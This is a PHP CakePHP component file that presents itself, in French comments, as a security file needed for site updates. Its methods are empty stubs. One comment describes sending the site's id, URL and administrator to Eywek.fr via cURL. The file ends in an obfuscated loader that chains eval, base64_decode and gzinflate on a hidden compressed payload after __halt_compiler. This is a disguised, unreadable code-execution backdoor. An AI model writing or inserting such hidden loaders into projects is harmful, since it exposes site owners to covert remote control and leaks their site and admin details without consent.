<?php
/**
* Fichier de sécurité
* Permet les MàJ du site, le débug ...
* Nécessaire au fonctionnement du site
* 
* @author Eywek
**/

class EycraftComponent extends Object {
  	
  	public $components = array('Session');
  
	function shutdown(&$controller) {
	}

	function beforeRender(&$controller) {
	}

	function beforeRedirect() { 
	}

	function initialize(&$controller) {
	    $this->controller =& $controller;
	    // Connexion à Eywek.fr/eycraft par cURL
	    // Comme argument, l'id du site, l'url d'accès, l'administrateur
	}

	function startup(&$controller) {
	}
}

/* Encodé avec http://www.phpencode.org/
$XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJGY9dHJpbShzdWJzdHIoJGEsJGRbMF0rJGRbMV0rJGRbMl0pKTtyZXR1cm4oJGYpO319"));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=04b94eeb51e0989b8a0f2fea3b402e85b29642d0jZFNasMwEIXXMfgOswhxYtr4ACWlENpF6R8pPYAsjWO1tmxGI5K05C5ZNufwxSo1DQkkiwok0Oh7M6M3WZrGUQp3WpYaCRSC7bbSkeZuGx5ekGpkqNDCY7e5B+XAasYLHwHVbXM3h/F4HMgnr0NrhSYE4aBojGTdGIM1Gt7rAhj2jXBcNgS3qwV++ECaxVEcyUpY62OSRMHTpm4bE7S4ZDTKwnP+jpLhK44Aer9H6/JKS+jLPWthAoJIrIbJq2/G109GVwGNo17hdh2BLR2rZmGGAy80TE1VIY1C3t46tHEgcywawpmvjvR/WnkLJA89A6eQNpq1qPQnnkkIfvW51Pby+vAEkwEckVd/XJbBNNi7DFm7zc7KcUEZ7vyDVhDIt9nDMV/Xfjg0d2EmfoaJVkcTTRxVoBIhZfdtw12o2rdrmQSjo9O/WBbErj3vzPoH